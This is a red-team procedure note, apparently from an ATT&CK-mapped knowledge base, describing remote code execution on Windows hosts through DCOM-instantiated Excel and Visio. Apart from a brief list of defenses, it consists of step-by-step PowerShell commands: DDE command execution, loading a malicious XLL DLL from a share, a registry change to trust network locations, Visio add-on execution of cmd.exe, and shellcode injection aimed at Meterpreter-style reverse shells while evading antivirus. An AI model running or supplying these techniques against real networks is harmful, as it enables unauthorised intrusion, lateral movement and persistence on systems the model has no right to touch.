---
type: procedure
verified: true
submitted: false
tactics:
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
techniques:
  - '[[techniques/Office Application Startup|T1137 - Office Application Startup]]'
  - '[[techniques/Remote Services|T1021 - Remote Services]]'
sub_techniques:
  - '[[sub-techniques/RPC-DCOM|T1021.003 - RPC/DCOM]]'
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/DCOM Exploitation]]'
  - '[[tags/DCOM via Office]]'
commands:
  - '[[commands/Excel-DDE-Remote-Execution]]'
  - '[[commands/Excel-RegisterXLL-Remote-Execution]]'
  - '[[commands/Visio-Remote-Execution]]'
platforms:
  - Windows
tools: []
validated: true
---

# DCOM-Office-Remote-Code-Execution

## Summary

DCOM Office Remote Code Execution leverages Distributed Component Object Model (DCOM) to execute arbitrary code on remote Windows systems through Office applications like Excel and Visio. This procedure outlines multiple techniques, including Dynamic Data Exchange (DDE) in Excel, XLL registration, and Visio add-on execution, as well as advanced shellcode injection methods. It enables lateral movement and persistence in Active Directory environments where DCOM is enabled and Office is installed.

## Description

This procedure exploits DCOM, a Microsoft technology for inter-process communication across machines, to instantiate Office applications remotely and execute code via their automation interfaces. Attackers with network access and valid credentials can create invisible instances of Excel or Visio on the target, bypassing traditional remote execution restrictions. Techniques include simple command execution via DDE or add-ons, and more advanced shellcode injection using Excel 4.0 macros. This is particularly effective in enterprise networks with legacy DCOM configurations. Prerequisites include domain credentials with remote execution rights and Office installations on the target. Outcomes include shell access, payload deployment, or further lateral movement.

## Requirements

1. Valid domain credentials with remote DCOM access to the target system.
2. Network connectivity to the target (e.g., via SMB or RPC ports 135, 445 open).
3. Microsoft Office (Excel or Visio) installed on the target Windows system.
4. PowerShell execution policy allowing scripts (or bypass via -ExecutionPolicy).
5. For XLL technique: Administrative access to modify registry on the attacker's session or pre-configured trusted locations.

## Defense

- Disable unnecessary DCOM endpoints using dcomcnfg.exe and restrict permissions to trusted users.
- Implement Least Privilege for DCOM: Use Group Policy to limit remote activation of Office CLSIDs.
- Monitor for anomalous Office process creation (e.g., excel.exe from non-user sessions) via Sysmon or EDR.
- Enable PowerShell logging and constrain Office macro execution (disable DDE, block external XLLs).
- Network segmentation to limit RPC/DCOM traffic between workstations.

## Objectives

1. Remotely instantiate Office applications via DCOM to execute arbitrary commands or payloads.
2. Achieve lateral movement to the target system without direct RDP or PsExec.
3. Establish persistence through scheduled tasks or implants delivered via executed code.

## Instructions

### Step 1: Verify DCOM Connectivity and Office Availability

**Context**: Confirm the target is reachable via DCOM and Office is installed to avoid execution failures.

Use PowerShell to test remote COM object creation for Excel.

**Command** ([[commands/Excel-DDE-Remote-Execution]]):
```powershell
$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "$ComputerName"))
$excel.Quit()
```

> This attempts to create and immediately close an Excel instance. If successful, no errors are thrown, confirming DCOM access.

### Step 2: Execute Commands via Excel DDE

**Context**: Use Excel's Dynamic Data Exchange to run system commands remotely without files or macros. This is reliable for simple command execution like spawning calc.exe.

**Command** ([[commands/Excel-DDE-Remote-Execution]]):
```powershell
$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "$ComputerName"))
$excel.DisplayAlerts = $false
$excel.DDEInitiate("cmd", "/c calc.exe")
$excel.Quit()
```

> Replace "calc.exe" with the desired command (e.g., "/c powershell -c Invoke-WebRequest..."). Success is indicated by the command running on the target without visible alerts.

### Step 3: Attempt XLL Registration for DLL Payload Execution

**Context**: Register a malicious XLL (Excel Add-in DLL) to execute code on Excel startup. Note: This technique is unreliable for fully remote targets due to security prompts and requires pre-setting trusted locations via registry.

First, set the registry key if accessible:
```powershell
reg add "HKEY_CURRENT_USER\Software\Microsoft\Office\16.0\Excel\Security\Trusted Locations" /v AllowsNetworkLocations /t REG_DWORD /d 1 /f
```

**Command** ([[commands/Excel-RegisterXLL-Remote-Execution]]):
```powershell
$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "$ComputerName"))
$excel.RegisterXLL("\\$ComputerName\share\EvilXLL.dll")
$excel.Quit()
```

> Place EvilXLL.dll on an accessible share. Expected: DLL loads and executes its entry point (e.g., reverse shell). Monitor for load errors if network locations are blocked.

### Step 4: Execute Commands via Visio Add-on

**Context**: Leverage Visio's add-on functionality to run executables as if they were plugins, providing another vector for command execution.

**Command** ([[commands/Visio-Remote-Execution]]):
```powershell
$visio = [activator]::CreateInstance([type]::GetTypeFromProgID("Visio.InvisibleApp", "$ComputerName"))
$visio.Addons.Add("C:\Windows\System32\cmd.exe").Run("/c calc.exe")
$visio.Quit()
```

> Customize the path and arguments (e.g., run a payload script). Success: Command executes invisibly on the target.

### Step 5: Advanced Shellcode Injection via Excel4DCOM

**Context**: For sophisticated payloads, inject shellcode into a remote Excel process using Excel 4.0 macros over DCOM. This requires downloading and executing the provided script.

Download and run the script from the gist.

**Code** ([[codes/Invoke-Excel4DCOM64-Shellcode-Injection]]):

> The script creates a remote Excel instance, executes an XLM macro to allocate memory, and injects shellcode (e.g., for Meterpreter). Provide target hostname, shellcode bytes, and optional proxy settings. Expected: Shellcode executes in excel.exe context without AV alerts if obfuscated.

### Step 6: Execute Shellcode with Invoke-ExShellcode

**Context**: Use a companion script to launch the injected shellcode, ensuring payload delivery and execution.

**Code** ([[codes/Invoke-ExShellcode-Execution]]):

> Run this after Step 5 to trigger the shellcode. Parameters include process ID of the remote Excel and shellcode buffer. Expected: Reverse shell or beacon connects back to attacker.
